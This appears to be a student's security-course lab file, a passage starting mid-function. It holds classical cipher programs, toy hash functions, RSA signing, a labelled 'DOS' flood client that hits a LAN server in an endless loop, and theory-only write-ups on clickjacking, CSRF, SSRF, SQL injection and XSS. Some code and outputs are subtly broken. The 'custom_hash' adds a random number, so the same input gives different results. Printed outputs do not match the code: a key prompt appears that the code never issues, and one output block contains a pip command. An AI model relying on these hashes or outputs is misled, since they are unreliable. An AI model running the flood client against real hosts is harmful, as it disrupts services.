    fill_null = int((row * col) - msg_len)
    msg_lst.extend('_' * fill_null)

    # create Matrix and insert message and 
    # padding characters row-wise 
    matrix = [msg_lst[i: i + col] 
              for i in range(0, len(msg_lst), col)]

    # read matrix column-wise using key
    for _ in range(col):
        curr_idx = key.index(key_lst[k_indx])
        cipher += ''.join([row[curr_idx] 
                          for row in matrix])
        k_indx += 1

    return cipher

# Decryption
def decryptMessage(cipher):
    msg = ""

    # track key indices
    k_indx = 0

    # track msg indices
    msg_indx = 0
    msg_len = float(len(cipher))
    msg_lst = list(cipher)

    # calculate column of the matrix
    col = len(key)
    
    # calculate maximum row of the matrix
    row = int(math.ceil(msg_len / col))

    # convert key into list and sort 
    # alphabetically so we can access 
    # each character by its alphabetical position.
    key_lst = sorted(list(key))

    # create an empty matrix to 
    # store deciphered message
    dec_cipher = []
    for _ in range(row):
        dec_cipher += [[None] * col]

    # Arrange the matrix column wise according 
    # to permutation order by adding into new matrix
    for _ in range(col):
        curr_idx = key.index(key_lst[k_indx])

        for j in range(row):
            dec_cipher[j][curr_idx] = msg_lst[msg_indx]
            msg_indx += 1
        k_indx += 1

    # convert decrypted msg matrix into a string
    try:
        msg = ''.join(sum(dec_cipher, []))
    except TypeError:
        raise TypeError("This program cannot",
                        "handle repeating words.")

    null_count = msg.count('_')

    if null_count > 0:
        return msg[: -null_count]

    return msg

# Driver Code
msg = input("Enter the message: ")

cipher = encryptMessage(msg)
print("Encrypted Message: {}".
               format(cipher))

decrypted_msg = decryptMessage(cipher)
print("Decrypted Message: {}".
       format(decrypted_msg))

OUTPUT
Enter the key: PLAYFAIR
Enter the message: HELLO WORLD
Encrypted Message: LPOOQVKZDPTT
Decrypted Message: HELLOWORLD__













HASH
import random

def custom_hash(input_string):
    ascii_sum = sum(ord(char) for char in input_string)
    mod_value = ascii_sum % 11
    random_int = random.randint(10, 1000)
    hashed_value = mod_value + random_int
    return hashed_value

input_string = input("Enter a string to hash: ")
hashed_value = custom_hash(input_string)
print("Hashed value:", hashed_value)

OUTPUT
Enter a string to hash: khushii
Hashed value: 327

=== Code Execution Successful ===









HASHING CREATE YOUR OWN
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import serialization

# Function to perform a simple hash (not cryptographically secure)
def simple_hash(message):
    hash_value = 0
    for char in message:
        # Add the ASCII value of the character multiplied by its position
        hash_value += (hash_value << 3) + ord(char)
    # Use a mask to ensure the hash is within a specific range, for example, a 32-bit integer
    return hash_value & 0xFFFFFFFF

# Test the simple hash function with the user's name
test_message = "Hello World, AV!"
hash_result = simple_hash(test_message)

# Generate private and public keys for RSA
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

# Sign a message using RSA
def sign_message(message, private_key):
    message = message.encode('utf-8')
    signature = private_key.sign(
        message,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    return signature

# Verify RSA signature
def verify_signature(message, signature, public_key):
    message = message.encode('utf-8')
    try:
        public_key.verify(
            signature,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except Exception as e:
        return False

# Create a signature for the test message
signature = sign_message(test_message, private_key)

# Now verify the signature
verification_result = verify_signature(test_message, signature, public_key)

# To output in terminal-like format, we will print the results
print(f"Hash result: {hash_result}")
print(f"Signature: {signature}")
print(f"Verification result: {verification_result}")

# Returning values just for the notebook output cell, this line can be removed for terminal output.
hash_result, signature, verification_result

OUTPUT
pip install cryptography

Hash result: 2394145435
Signature: b'0\x04\x1dPq\xdbt\x06U\xc7\xbfZ\x00\x95\xb6\x95\xdc\xcd\x8f\x88\xedV[\xec\xa3\xe9k\x84\xeb0Z\x7f\xc4\xc2\xdc\xfb\x1f\xffJ\xa0\xf6b\xf9\xab\xe4\xa6\xf0d\x88\xb7\xff\x90\xd4\xd6\xb8\x03"\x02\x15\xc6\xdb\x84n\x0b\xeb\xff\xa6q\xaa\x8bX\xc5i\xbf"\x8b\x80\x0c\xa4\xaf\xcb'
Verification result: True

Experiment 05
Aim: Develop your own hashing algorithm based on your logic.
Tools: Visual Studio Code(C++)
Theory: Hashing algorithms
Hashing algorithms are cryptographic functions that convert input data of arbitrary size 
into a fixed-size string of bytes, typically for the purpose of data integrity verification, 
password hashing, and digital signatures. These algorithms play a critical role in ensuring 
the security and integrity of data in various applications.
Hashing serves several important purposes despite being irreversible:
1. Data Integrity: Hashing is commonly used to verify the integrity of data. By storing 
the hash of a piece of data alongside the data itself, you can later recompute the hash and 
compare it to the stored hash. If the hashes match, it's highly likely that the data hasn't 
been altered. This is commonly used in cryptographic protocols, file verification, and 
ensuring data consistency.
2. Data Security: Hashing is a fundamental component of many cryptographic 
algorithms. Passwords, for example, are often hashed before being stored in a database. 
When a user attempts to log in, the system hashes the provided password and compares it 
to the stored hash. This way, even if the database is compromised, the actual passwords are 
not easily retrievable.
3. Efficient Data Retrieval: Hashing is used in data structures like hash tables to 
efficiently store and retrieve data based on keys. In this context, the hash serves as an
index to quickly locate the associated data.
4. Anonymization: Hashing can be used to anonymize sensitive information. For 
example, hashing email addresses or user IDs before storing or transmitting them can 
protect privacy while still allowing for certain operations (like comparing two hashed 
values).
5. Cryptographic Techniques: Hashing is used in cryptographic techniques like digital 
signatures and message authentication codes (MACs) to ensure the authenticity and 
integrity of messages without revealing the contents.
So, even though hashing is irreversible, it's an essential tool in modern computing for 
various purposes related to security, data integrity, and efficiency.
Algorithm Development:
1. Initialize Variables: Set the initial hash value (`hash`) to 0 and the initial power 
value (`power`) to 1.
2. Iterate Through Characters: Loop through each character `c` in the input string.
3. Convert Character to Integer: Convert the character `c` to an integer representing 
its position in the alphabet by subtracting the ASCII value of 'a' from the ASCII value of
`c`.
This gives a value between 0 and 25 for lowercase letters. For uppercase letters, you would 
subtract the ASCII value of 'A' instead.
4. Update Hash Value: Update the hash value by adding the product of `(c - 'a' + 
1)` (the converted integer value) and `power` to the current hash value (`hash`). This 
step is equivalent to multiplying the current hash value by a base (here, 26) and adding 
the converted integer value.
5. Update Power: Update the power value by multiplying it by a prime number 
(here, 31) to prevent overflow and keep the hash values spread out.
6. Repeat: Repeat steps 2-5 for each character in the input string.
7. Modular Arithmetic: After processing all characters, take the hash value modulo a 
large prime number (here, 1000000007) to ensure the hash value stays within a reasonable 
range and to reduce the likelihood of collisions.
8. Return Hash Value: Return the final hash value.
Implementation:
Code:
#include <bits/stdc++.h> 
using namespace std;
unsigned int customHash(const string& input) { 
const unsigned int prime = 31;
const unsigned int mod = 1000000007;
unsigned int hash = 0; 
unsigned int power = 1;
for (char c : input) {
hash = (hash + (c - 'a' + 1) * power) % mod; 
power = (power * prime) % mod;
}
return hash;
}
int main() { string 
message;
cout<<"Enter the message : "; 
getline(cin,message);
unsigned int hashValue = customHash(message);
cout << "Hash value of '" << message << "': " << hashValue << endl;
return 0;
}
Output:
Enter the message : my name is siddharth
Hash value of 'my name is siddharth': 492115841
Result and Discussion:
In this experiment, we developed and implemented a custom hashing algorithm using various 
mathematical operations. The custom hash generated for the input text was obtained 
successfully.
Learning Outcomes:
1. Participants gained insight into the foundational principles of hashing algorithms, 
such as modular arithmetic, prime numbers, and bitwise operations. They learned 
how these concepts contribute to the design of hashing algorithms and their 
effectiveness in generating unique hash values.
2. Participants acquired practical experience in developing a custom hashing algorithm 
using C++. By implementing the algorithm, they learned how to translate
theoretical concepts into functional code, including iterating through input data, 
performing arithmetic operations, and managing data types.
3. Participants learned about the practical applications of hashing algorithms in ensuring 
data security and integrity. They understood how hashing is utilized in cryptographic 
protocols, such as password hashing and data authentication, to protect sensitive 
information, prevent tampering, and verify the authenticity of data
Conclusion: Through this experiment, participants gained valuable insights into the intricacies 
of hashing algorithms and their practical implementation. Additionally, participants developed 
a deeper understanding of the role of hashing algorithms in data security and cryptography, 
which is essential in today's digital age.















CAESAR
#include<stdio.h>

void encrypt(char message[], int key) {
    int i;
    char ch;
    for(i = 0; message[i] != '\0'; ++i){
        ch = message[i];
        if(ch >= 'a' && ch <= 'z'){
            ch = ch + key;
            if(ch > 'z'){
                ch = ch - 'z' + 'a' - 1;
            }
            message[i] = ch;
        }
        else if(ch >= 'A' && ch <= 'Z'){
            ch = ch + key;
            if(ch > 'Z'){
                ch = ch - 'Z' + 'A' - 1;
            }
            message[i] = ch;
        }
    }
    printf("Encrypted message: %s\n", message);
}

void decrypt(char message[], int key) {
    int i;
    char ch;
    for(i = 0; message[i] != '\0'; ++i){
        ch = message[i];
        if(ch >= 'a' && ch <= 'z'){
            ch = ch - key;
            if(ch < 'a'){
                ch = ch + 'z' - 'a' + 1;
            }
            message[i] = ch;
        }
        else if(ch >= 'A' && ch <= 'Z'){
            ch = ch - key;
            if(ch < 'A'){
                ch = ch + 'Z' - 'A' + 1;
            }
            message[i] = ch;
        }
    }
    printf("Decrypted message: %s\n", message);
}

int main() {
    char message[100];
    int key;
    
    printf("Enter a message: ");
    fgets(message, sizeof(message), stdin);
    printf("Enter key: ");
    scanf("%d", &key);
    
    encrypt(message, key);
    decrypt(message, key);

    return 0;
}
-------------------
Enter a message: Hello
Enter key: 3
Encrypted message: Khoor

Decrypted message: Hello

















AUTOKEY
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <math.h>

#define VAL(PTR) (*PTR)

typedef char* STRING;
typedef char** STRING_REF;

void autokey_encrypt_decrypt(STRING_REF str, char key, int encrypt){
	int str_length, itr_str, next_key,current_key, remainder;
	str_length = strlen(VAL(str));
	for(itr_str = 0 ; itr_str < str_length ; ++itr_str){
		if(isalpha(VAL(str)[itr_str])){
			VAL(str)[itr_str] = toupper(VAL(str)[itr_str]);
		}
	}
	next_key = toupper(key)-'A';
	for(itr_str = 0 ; itr_str < str_length ; ++itr_str){
		if(isalpha(VAL(str)[itr_str])){
			current_key = next_key;
			if(encrypt){
				next_key = VAL(str)[itr_str]-'A';
				VAL(str)[itr_str] = (VAL(str)[itr_str]-'A'+current_key)%26+'A';
			}
			else{
				remainder = (VAL(str)[itr_str]-'A'-current_key)%26+'A';
				VAL(str)[itr_str] = remainder < 'A' ? remainder + 26 : remainder ;
				next_key = VAL(str)[itr_str]-'A';
			}
		}
	}
}

void flush_stdin()
{
	while(fgetc(stdin) != '\n');
}

int main(int argc, char **argv)
{
	int length;
	char key;
	char *str;
	printf("Enter the key to be used for encryption: ");
	scanf("%c",&key);
	printf("Enter the length of the string: ");
	scanf("%d",&length);
	str = (char*)malloc((length+1)*sizeof(char));
	flush_stdin();
	printf("Input the string you want to encrypt: ");
	fgets(str,length+1,stdin);
	flush_stdin();
	autokey_encrypt_decrypt(&str,key,1);
	printf("\nThe text after encrypting is: %s",str);
	autokey_encrypt_decrypt(&str,key,0);
	printf("\nAfter decrypting the same encrypted text: %s",str);
	printf("\n");
	free(str);
	return 0;
}

---------------------------------------------------
SAMPLE OUTPUT:

Enter the key to be used for encryption: m
Enter the length of the string: 15
Input the string you want to encrypt: attack is today

The text after encrypting is: MTMTCM SA LHRDY
After decrypting the same encrypted text: ATTACK IS TODAY


















AFFINE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define ALPHABET_SIZE 26

int gcd(int a, int b) {
    if (b == 0)
        return a;
    return gcd(b, a % b);
}

int modInverse(int a, int m) {
    for (int x = 1; x < m; x++)
        if ((a * x) % m == 1)
            return x;
    return -1;
}

void affine_encrypt(char *plaintext, int a, int b) {
    int len = strlen(plaintext);
    for (int i = 0; i < len; i++) {
        if (plaintext[i] >= 'A' && plaintext[i] <= 'Z') {
            plaintext[i] = ((a * (plaintext[i] - 'A') + b) % ALPHABET_SIZE) + 'A';
        } else if (plaintext[i] >= 'a' && plaintext[i] <= 'z') {
            plaintext[i] = ((a * (plaintext[i] - 'a') + b) % ALPHABET_SIZE) + 'a';
        }
    }
}

void affine_decrypt(char *ciphertext, int a, int b) {
    int len = strlen(ciphertext);
    int a_inv = modInverse(a, ALPHABET_SIZE);
    for (int i = 0; i < len; i++) {
        if (ciphertext[i] >= 'A' && ciphertext[i] <= 'Z') {
            ciphertext[i] = (a_inv * (ciphertext[i] - 'A' - b + ALPHABET_SIZE)) % ALPHABET_SIZE + 'A';
        } else if (ciphertext[i] >= 'a' && ciphertext[i] <= 'z') {
            ciphertext[i] = (a_inv * (ciphertext[i] - 'a' - b + ALPHABET_SIZE)) % ALPHABET_SIZE + 'a';
        }
    }
}

int main() {
    char plaintext[100], ciphertext[100];
    int a, b, choice;

    printf("Enter the value of 'a' (must be co-prime with 26): ");
    scanf("%d", &a);

    if (gcd(a, ALPHABET_SIZE) != 1) {
        printf("Error: 'a' must be co-prime with 26.\n");
        return 1;
    }

    printf("Enter the value of 'b': ");
    scanf("%d", &b);

    printf("Enter the plaintext: ");
    scanf(" %[^\n]s", plaintext);

    printf("Choose operation:\n");
    printf("1. Encryption\n");
    printf("2. Decryption\n");
    scanf("%d", &choice);

    switch (choice) {
        case 1:
            affine_encrypt(plaintext, a, b);
            printf("Encrypted text: %s\n", plaintext);
            break;
        case 2:
            printf("Enter the ciphertext: ");
            scanf(" %[^\n]s", ciphertext);
            affine_decrypt(ciphertext, a, b);
            printf("Decrypted text: %s\n", ciphertext);
            break;
        default:
            printf("Invalid choice.\n");
    }

    return 0;
}
-----------------------------
Suppose we choose 
a=5 and b=8.

Encryption:Input:
Plain text: "Hello"

Output:
Encrypted text: "Czggv"

Decryption:Input:
Cipher text: "Czggv"

Output:
Decrypted text: "Hello"














DOS:
SERVER:

import socket
import logging

# Setup basic logging
logging.basicConfig(level=logging.INFO)

HOST = '0.0.0.0'  # Listen on all available network interfaces
PORT = 12345  # Choose a port number (make sure it's not already in use)

# Create a TCP socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# This option helps in reusing the same port (helpful after a server restart)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Bind the socket to the host and port
server_socket.bind((HOST, PORT))

# Listen for incoming connections
server_socket.listen()
logging.info(f"Server listening on {HOST}:{PORT}")

try:
    while True:  # Main loop to accept incoming connections
        client_socket, client_address = server_socket.accept()
        logging.info(f"Connection from {client_address}")

        try:
            while True:  # Loop to handle continuous communication
                # Example of receiving data (you can adjust according to your needs)
                data = client_socket.recv(1024)
                if not data:
                    break  # Break the loop if no data is received
                logging.info(f"Received data from {client_address}: {data.decode()}")

                # Example sending data back - echo (you can adjust this part)
                client_socket.sendall(data)
        except Exception as e:
            logging.error(f"An error occurred: {e}")
        finally:
            client_socket.close()  # Make sure to close the client socket

except KeyboardInterrupt:
    logging.info("Server is shutting down.")
finally:
    server_socket.close()  # Ensure the server socket is closed on exit


------------------------------------------------------------------------
Client:

import socket
import time

def ping_server(host, port, num_pings):
    # Calculate the sleep duration to distribute the pings across one second
    sleep_duration = 1.0 / num_pings if num_pings > 0 else 0

    while True:  # Start an infinite loop
        for _ in range(num_pings):
            start_time = time.time()

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                try:
                    s.connect((host, port))
                    # You can modify this message to be whatever you'd like
                    message = "ping"
                    s.sendall(message.encode())
                    data = s.recv(1024)
                    print(f"Received: {data.decode()}")
                except Exception as e:
                    print(f"An error occurred: {e}")

            # Calculate the actual time taken to send a ping and adjust the sleep time
            elapsed_time = time.time() - start_time
            adjusted_sleep_duration = max(0, sleep_duration - elapsed_time)
            time.sleep(adjusted_sleep_duration)
        # This sleep ensures the loop runs once per second, adjust as needed
        time.sleep(1 - num_pings * sleep_duration)

# Replace '192.168.207.182' and 12345 with your server's IP and port
HOST = '192.168.74.129'  
PORT = 12345
NUM_PINGS = int(input("Enter how many times to ping per second: "))

ping_server(HOST, PORT, NUM_PINGS)





Enter how many times to ping per second: 2
Received: ping
Received: ping
Received: ping
Received: ping
Received: ping
Received: ping
















Experiment 06
Aim: Identify the vulnerable website for Clickjacking, CSRF, SSRF
Tools: Burp Suite, Port Swigger, Kali Linux
Theory: Clickjacking, CSRF and SSRF
a.	Clickjacking: Clickjacking is a technique used by malicious actors to trick users into clicking on something different from what they perceive they are clicking on. This is usually done by overlaying transparent or opaque layers over a legitimate website, with the intention of capturing the user's clicks and interactions. The user may believe they are clicking on a harmless element of the visible page, but they are unwittingly interacting with hidden elements, potentially leading to unintended actions such as installing malware, revealing personal information, or making unauthorized transactions.
b.	CSRF: CSRF stands for Cross-Site Request Forgery. It is a type of attack where a malicious website tricks a user's browser into making unintended requests to a different website where the user is authenticated. The attacker exploits the fact that the user is logged into a legitimate website, and without the user's knowledge, sends forged requests from the user's browser to the target website. To execute a CSRF attack, the attacker typically lures the victim to visit a malicious website or click on a malicious link. Once the victim is on the malicious page, the attacker's code can automatically make requests to the target website using the victim's active session, potentially causing unwanted actions. Protecting against CSRF typically involves techniques such as using anti-CSRF tokens, which are unique tokens generated by the server and embedded in forms or requests. These tokens are then validated upon submission to ensure that the request originates from the legitimate user and not from a malicious third party.
c.	SSRF: SSRF stands for Server-Side Request Forgery. It is a type of security vulnerability where an attacker can manipulate the server into making unintended requests to other resources on the internet. In an SSRF attack, the attacker typically exploits functionalities of the vulnerable server that allow it to make HTTP requests to other servers. By manipulating parameters or input fields, the attacker tricks the server into sending requests to internal systems, other servers on the internet, or services that should not be accessible from the server. For example, an attacker might use SSRF to make the server request internal resources or even attack other systems within the same network that are not supposed to be accessible externally. To prevent SSRF attacks, it is essential to validate and sanitize user inputs, restrict the server's ability to make requests to external resources, and implement proper access controls and firewall rules to limit the server's reach. 
Identifying specific vulnerable websites for security exploits such as Clickjacking, CSRF, and SSRF is not appropriate or ethical. These vulnerabilities can exist in any web application, regardless of its size or popularity. It is essential for website developers and administrators to be aware of these vulnerabilities and take steps to mitigate them through proper security practices, such as input validation, access controls, and implementing security headers. However, it's worth noting that many websites have historically been vulnerable to these types of attacks, leading to widespread exploitation by malicious actors. Security researchers and ethical hackers often discover vulnerabilities in popular websites and report them to the respective organizations to prompt fixes and enhance security measures.

Implementation: 
1. Clickjacking
       
2. CSRF

3. SSRF

Result and Discussion:
1.	Understanding Vulnerabilities: Research could focus on understanding the technical aspects of Clickjacking, CSRF, and SSRF vulnerabilities, including how they work, their potential impact on web applications, and real-world examples of their exploitation.
2.	Tools and Techniques: Discussion could centre around the use of tools like Burp Suite, Port Swigger, and Kali Linux for identifying and exploiting these vulnerabilities. This could include exploring the functionalities of these tools, techniques for using them effectively, and best practices for conducting ethical hacking activities.
3.	Mitigation Strategies: Discussion could focus on effective mitigation strategies for preventing Clickjacking, CSRF, and SSRF attacks. This could include techniques such as input validation, output encoding, implementing security headers, using anti-CSRF tokens, and network-level protections.
4.	Real-World Impact: Discussion could explore the real-world impact of Clickjacking, CSRF, and SSRF vulnerabilities on organizations and individuals. This could include case studies of security breaches resulting from these vulnerabilities, the financial and reputational damage incurred, and lessons learned for improving security posture.

Learning Outcomes:
1.	Understanding of Vulnerabilities: By exploring vulnerabilities such as Clickjacking, CSRF, and SSRF in a controlled setting, individuals can gain a deeper understanding of how these vulnerabilities work and their potential impact on web applications.
2.	Hands-On Experience with Tools: Using tools like Burp Suite, Port Swigger, and Kali Linux provides practical experience in conducting security assessments, penetration testing, and vulnerability analysis. Learners can become proficient in using these tools to identify and mitigate vulnerabilities effectively.
3.	Knowledge of Attack Techniques: Individuals can learn various attack techniques and methodologies used by hackers to exploit vulnerabilities, including how attackers manipulate user interactions, forge requests, and abuse server-side functionality.


















 
Experiment 09 
Aim: Perform and analyse SQL injection attack and HTML injection attack 
Tools: Kali Linux, Sqlmap 
Theory: SQL injection attack, HTML injection attack 
a. SQL injection attack: It is a type of cybersecurity exploit where an attacker inserts malicious SQL (Structured Query Language) code into input fields on a website or application, with the intention of manipulating the backend database. SQL injection attacks are among the oldest and most common types of attacks on web applications. 
Here's how a SQL injection attack typically works: 
Vulnerability Identification- The attacker identifies a vulnerable input field on a web application that interacts with a database. This could be a login form, search field, or any other input field that accepts user input and passes it to the database. 
Injection- The attacker then inserts specially crafted SQL queries into the input fields. These queries are designed to exploit vulnerabilities in the application's code. 
Execution- When the application processes the input, it unwittingly executes the injected SQL code along with its legitimate queries. 
Data Access- Depending on the attacker's goals, the injected SQL code may perform various actions, such as retrieving sensitive data, modifying or deleting data, or even executing administrative commands on the database server. 
Consequences- The consequences of a successful SQL injection attack can range from unauthorized access to sensitive information (such as usernames, passwords, credit card numbers, etc.) to complete compromise of the affected system. 
b. HTML injection attack: HTML injection, also known as HTML injection attack or code injection, is a type of cybersecurity exploit where an attacker injects malicious HTML or client-side scripting code into a web application. This code is then executed within the context of the victim's browser, potentially allowing the attacker to steal information, perform unauthorized actions, or deface the website. 
Here's how an HTML injection attack typically works: 
Vulnerability Identification- The attacker identifies a vulnerable input field or parameter in a web application that allows user-supplied content to be displayed on the webpage without proper sanitization or encoding. 
Injection- The attacker then injects specially crafted HTML or client-side scripting code into the vulnerable input field. This code can include JavaScript, HTML tags, or other markup languages. 
Execution- When the web application renders the injected content on the webpage, the malicious code is executed within the context of the victim's browser. This can lead to a variety of consequences, depending on the nature of the injected code.  
Consequences- HTML injection attacks can have various consequences, including stealing cookies or session tokens, redirecting users to malicious websites, phishing attacks, defacement of web pages, or even executing actions on behalf of the user without their consent. 
 
Implementation:  
1a. SQL injection using queries -  

1b. SQL injection using sqlmap -  

2. HTML Injection –   
	 	 	 	 
 


















Experiment No. 7
Aim: Study of packet sniffer tools: wireshark,
1. Download and install wire shark and capture icmp, tcp, and http packets in promiscuous 
mode.
2. Explore how the packets can be traced based on different filters
Objectives:
• Understand the need for traffic analysis.
• Understand the how packet sniffing is done using wire shark.
• Trace and understand various packets from dynamic traffic.
Outcomes: The learner will be able to
• Sniff network packets and study insights of packets to get detail network 
information.
Hardware / Software Required: Unix/Linux/Windows, wire shark
Theory:
Wire shark, a network analysis tool formerly known as Ethereal, captures packets in real time 
and display the min human-readable format. Wire shark includes filters, color-coding and other 
features that let you dig deep into network traffic and inspect individual packets.
Features of Wire shark:
• Available for UNIX and Windows.
• Capture live packet data from a network interface.
• Openfilescontainingpacketdatacapturedwithtcpdump/WinDump,Wireshark,anda
• Number of other packet capture programs.
• Import packets from text files containing hex dumps of packet data.
• Display packets with very detailed protocol information.
• Export some or all packets in a number of capture file formats.
• Filter packets on many criteria.
• Search for packets on many criteria.
• Colorize packet display based on filters.
• Create various statistics.
Capturing Packets
After downloading and installing wire shark, you can launch it and click the name of an interface 
under Interface List to start capturing packets on that interface. For example, if you want to 
capture traffic on the wireless network, click your wireless interface. You can configure 
advanced features by clicking Capture Options.
As soon as you click the interface‘s name, you‘ll see the packets start to appearing real time.
Wire shark captures each packet sent to or from your system. If you‘re capturing on a wireless 
interface and have promiscuous mode enabled in your capture options, you‘ll also see other the 
other packets on the network
Wire shark uses colors to help you identify the types of traffic at a glance. By default, green is 
TCP traffic, dark blue is DNS traffic, light blue is UDP traffic, and black identifies TCP packets 
with problems — for example, they could have been delivered out-of-order.
Filtering Packets
If you‘re trying to inspect something specific, such as the traffic a program sends when phoning 
home, it helps to close down all other applications using the network so you can narrow down 
the traffic. Still, you‘ll likely have a large amount of packets to sift through. That‘s where Wire 
shark‘s filters come in.
The most basic way to apply a filter is by typing it into the filter box at the top of the window 
and clicking Apply (oppressing Enter).
For example, type—dns ¦and you‘ll see only DNS packets. When you start typing, Wire shark 
will help you auto complete your filter.
Conclusion:
Wire shark installation and network traffic analysis using packet sniffing is done. Detailed 
information about packets is explored by applying filter
















Experiment 10
Aim: Perform Cross-Site Scripting attack and analyse its impact on security
Tools: Kali Linux
Theory: Cross-Site Scripting Attack (XSS Attack)
Cross-site scripting (XSS) is a type of security vulnerability typically found in web applications. 
It occurs when a web application allows users to input data that is then included, unsanitized, in 
the output HTML content returned to other users. This can enable attackers to inject malicious 
scripts into web pages viewed by other users.
There are three main types of XSS attacks:
1. Reflected XSS: In this type of attack, the malicious script is injected into a web application, 
and the server reflects it back to the user in the response. For example, an attacker might 
craft a URL with a malicious script embedded in it and trick a user into clicking on it. 
When the user clicks the link, the script executes in the context of the victim's browser.
2. Stored XSS: In this scenario, the malicious script is stored on the server and then served 
to all users who access the compromised page or resource. This type of XSS attack is 
particularly dangerous because it can affect multiple users and persists over time. For 
example, an attacker might inject a script into a comment field on a website, and when 
other users view that comment, the script executes in their browsers.
3. DOM-based XSS: Unlike the other two types, DOM-based XSS does not involve serverside processing. Instead, the attack occurs entirely within the victim's browser. It exploits 
vulnerabilities in client-side scripts that manipulate the Document Object Model (DOM) 
of a web page. The attacker injects a malicious script that the client-side script unwittingly 
executes, leading to a security compromise.
4. Client-Side Scripting: XSS attacks primarily target web applications that involve clientside scripting languages such as JavaScript. Attackers exploit vulnerabilities in the way 
user input is processed and displayed in the browser.
5. Cookie Theft and Session Hijacking: One of the primary objectives of XSS attacks is to 
steal sensitive information such as session cookies or login credentials. Once an attacker 
gains access to session cookies, they can impersonate the victim and perform actions on 
their behalf, leading to session hijacking.
6. Phishing and Malware Distribution: XSS vulnerabilities can be leveraged to execute 
phishing attacks, where attackers mimic legitimate websites to trick users into revealing 
confidential information. Additionally, attackers may use XSS to distribute malware by 
injecting malicious scripts that redirect users to websites hosting exploit kits or malware 
downloads.
7. Contexts Vulnerable to XSS: XSS vulnerabilities often occur in various contexts within 
web applications, including input fields, URLs, HTTP headers, and even within JavaScript 
code itself. It's crucial for developers to identify and sanitize all user-controllable inputs to 
prevent XSS.
8. Same-Origin Policy Bypass: The Same-Origin Policy (SOP) is a security mechanism 
implemented by web browsers to restrict interactions between scripts from different origins 
(e.g., domains). However, XSS attacks can bypass SOP by executing within the context of 
a trusted origin, allowing attackers to access sensitive data or perform actions on behalf of 
the user across different domains.
9. XSS Worms: In some cases, XSS vulnerabilities can be exploited to create selfpropagating XSS worms. These worms automatically spread from one vulnerable page to 
another, infecting more users and amplifying the impact of the attack.
10. Client-Side Defenses: While server-side input validation and output encoding are crucial 
for mitigating XSS vulnerabilities, client-side defenses such as Content Security Policy 
(CSP) can also help prevent XSS attacks. CSP allows web developers to define a whitelist 
of trusted sources for scripts, stylesheets, and other resources, thereby limiting the 
execution of potentially malicious scripts.
XSS attacks can have serious consequences, including theft of sensitive information (such as 
session cookies or credentials), defacement of websites, or redirection to malicious websites. To 
prevent XSS attacks, web developers should implement proper input validation and output 
encoding techniques, such as escaping special characters and using frameworks that automatically 
handle these security measures. Additionally, web application firewalls and security scanning tools 
can help detect and mitigate XSS vulnerabilities.
Implementation: 
a. XSS Attack –
b. Reflected XSS Attack -
Learning Outcomes:
LO1. Understanding of Web Security Fundamentals: Learners will gain a foundational 
understanding of web security concepts, including common vulnerabilities like XSS, the impact 
they can have on web applications, and the importance of implementing robust security 
measures.
LO2. Knowledge of XSS Attack Techniques: Students will learn about the various techniques 
used by attackers to exploit XSS vulnerabilities, including reflected XSS, stored XSS, and 
DOM-based XSS. They will understand how attackers craft malicious payloads and exploit user 
input to execute unauthorized scripts.
LO3. Ability to Identify XSS Vulnerabilities: Upon completing their studies, learners will be 
able to identify potential XSS vulnerabilities in web applications by analyzing code, input 
validation processes, and output encoding mechanisms. They will develop the skills to conduct 
manual and automated security assessments to detect XSS flaws.
